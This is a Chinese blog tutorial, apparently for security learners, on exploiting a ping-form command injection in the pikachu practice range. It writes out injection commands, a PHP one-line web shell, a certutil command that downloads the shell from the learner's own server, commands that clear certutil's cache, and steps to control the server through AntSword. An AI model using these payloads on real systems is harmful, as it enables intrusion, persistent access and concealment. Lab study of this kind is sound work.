---
title: 网络安全学习-RCE
tags:
  - 网络安全
readmore: true
date: 2023-02-09 11:18:31
updated: 2023-02-09 11:18:31
---

RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。

<!-- more -->

### 环境搭建

环境使用 pikachu 的靶场，下载地址：https://github.com/zhuifengshaonianhanlu/pikachu

安装方式可自行百度，推荐使用 phpstudy 创建网站，方便快捷。

### ping 命令漏洞

打开 pikachu 靶场中的 RCE -> exec "ping"，在表单中输入 127.0.0.1 可以看到回显，说明执行了 ping 127.0.0.1 的命令。

#### 测试漏洞

紧接着使用 && 连接符在 127.0.0.1 的后面连接上 whoami 命令

```bash
127.0.0.1 && whoami
# whoami 作用是查看操作系统的用户名
# && 连接符，当前面的命令执行后，后面的命令才会执行
```

可以看到两个命令全都执行了，说明这个位置有漏洞，我们可以加以利用。

#### 创建一句话木马(直接写入文件)

输入新的命令：

```bash
127.0.0.1 && echo "<?=eval($_POST['cmd']);?>" > shell.php
# echo 输出字符串
# $_POST['cmd'] 接受来自 POST 请求且参数名为 cmd 的值
# eval() 执行接收到的字符串
# > 将内容输入到指定的文件中
```

此时就在该页面的位置创建了一个 shell.php 文件并输入对应内容。

#### 创建一句话木马(文件下载方式)

除了使用 echo 这种直接写入的办法，还可以使用 certutil 命令从远处下载木马文件。

##### 启动本地服务器

这种方法需要拥有一个服务器，从服务器上下载文件；练习时我们使用 Python 来创建一个本地服务器作为演示。

在安装好 Python 后，创建一个文件夹并创建 shell.php 文件，写入上文的一句话木马。

**目录不要包含中文**

打开命令行输入命令：

```bash
python -m http.server 8080
# -m 将 python 中的模块当作脚本运行
# 8080 服务启动的端口
```

服务器启动成功~

##### 访问本地服务器

输入命令查看自己电脑的 ip：

```bash
# windows
ipconfig
# linux
iconfig
```

**注意 Windows 和 Linux 查看 ip 的命令不同**

在浏览器输入：

```bash
http://192.168.31.195:8080/
```

成功访问后可以看到一个 shell.php 文件。

##### 下载文件

在靶场的表单中输入：

```bash
127.0.0.1 && certutil -urlcache -f -split http://192.168.31.195:8080/shell.php
# -urlcache 显示或删除URL缓存条目
# -f 覆盖的现有文件，后面要跟着下载文件的 url
# -split 保存到文件
# 杀毒软件可能会报毒，因为是自己的命令，我们就允许它执行
```

看到页面有其他的显示，说明文件已经下载成功~

##### 删除下载缓存

certuril 命令有一个弊端就是下载文件后会保留缓存。

输入命令查看缓存：

```bash
certutil -urlcache *
# 查看所有缓存
cerutil -urlcache 192
# 查看包含 192 字符串的缓存
```

输入命令删除缓存：

```bash
certutil -urlcache * delete
# 删除所有缓存
certuil -urlcache 192 delete
# 删除包含 192 字符串的缓存
```

#### 蚁剑连接后台

成功上传一句话木马后，使用蚁剑进行连接。

蚁剑源码下载地址：https://github.com/AntSwordProject/antSword

蚁剑启动器下载地址：https://github.com/AntSwordProject/AntSword-Loader

将蚁剑源码解压后，打开启动器目录选择刚刚的源码文件，稍等片刻会成功启动。

也可以直接使用启动器下载；若遇到解压失败的情况，给予源码的文件夹所有权限即可。 

启动后，在蚁剑空白处右键，选择添加数据；

![](http://pic.mewhz.com/blog/rce-1.png)

在基础配置中的 url 地址，输入靶场中木马所在的 url；

连接密码输入 cmd，即刚刚木马中 $_POST 的参数；

![](http://pic.mewhz.com/blog/rce-2.png)

单击测试连接，显示连接成功后，单击添加；

右键刚刚添加的记录，选择文件管理就可以对木马所在的服务器进行文件操作；

![](http://pic.mewhz.com/blog/rce-3.png)

![](http://pic.mewhz.com/blog/rce-4.png)



仅供学习交流使用~
